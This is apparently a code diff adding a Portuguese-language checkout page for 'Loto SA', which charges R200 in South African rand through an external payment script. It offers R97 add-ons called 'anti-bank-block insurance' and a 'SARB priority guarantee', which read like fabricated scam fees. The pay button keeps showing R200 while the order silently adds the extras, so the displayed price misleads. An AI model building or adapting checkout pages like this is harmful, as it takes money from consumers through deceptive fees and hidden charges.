@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Checkout – Loto SA (R200)</title>
+  <style>
+    body {font-family:Arial,Helvetica,sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}
+    .card {background:#fff;padding:2rem;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.1);max-width:420px;text-align:center;}
+    .btn{background:#0066ff;color:#fff;border:none;padding:0.75rem 1.5rem;border-radius:4px;font-size:1rem;cursor:pointer;}
+    .btn:disabled{background:#999;cursor:not-allowed;}
+    .options{margin:1rem 0;text-align:left;}
+  </style>
+  <script src="https://pay.africagrabpoint.com/embed.js"></script>
+</head>
+<body>
+  <div class="card">
+    <h2>Compra – R 200,00</h2>
+    <p>Preço total: <strong>R 200,00</strong></p>
+    <div class="options">
+      <label><input type="checkbox" id="upsell"/> ​Upsell – +R 97,00 (Seguro Anti‑Bloqueio Bancário)</label><br>
+      <label><input type="checkbox" id="downsell"/> ​Downsell (order‑bump) – +R 97,00 (Garantia de Prioridade SARB)</label>
+    </div>
+    <button id="payBtn" class="btn">Pagar R 200,00</button>
+    <p id="status" style="margin-top:1rem;"></p>
+  </div>
+
+  <script>
+    // Endereço do seu endpoint que cria a ordem e devolve checkout_token
+    const CREATE_ORDER_ENDPOINT = "/api/create-order-200.php"; // ajuste se necessário
+
+    document.getElementById('payBtn').addEventListener('click', async () => {
+      const btn = event.target;
+      btn.disabled = true;
+      btn.textContent = 'Processando...';
+      try {
+        const extra = (document.getElementById('upsell').checked ? 9700 : 0) +
+                      (document.getElementById('downsell').checked ? 9700 : 0);
+        const resp = await fetch(CREATE_ORDER_ENDPOINT, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            order_id: 'LOTO-200-' + Date.now(),
+            title: 'Loto SA – Produto R200',
+            amount_minor: 20000 + extra,
+            currency: 'ZAR',
+            customer: {
+              name: 'Cliente',
+              email: 'cliente@example.com',
+              phone: ''
+            }
+          })
+        });
+        const data = await resp.json();
+        if (!resp.ok) throw new Error(data.error || 'Falha ao criar ordem');
+        const token = data.checkout_token;
+        const result = await CreaPay.pay({
+          checkoutToken: token,
+          orderId: data.order_id,
+          onStatus: (state) => {
+            document.getElementById('status').textContent = 'Status: ' + state.status;
+          }
+        });
+        console.log('Resultado pagamento', result);
+      } catch (e) {
+        console.error(e);
+        document.getElementById('status').textContent = 'Erro: ' + e.message;
+      } finally {
+        btn.disabled = false;
+        btn.textContent = 'Pagar R 200,00';
+      }
+    });
+  </script>
+</body>
+</html>
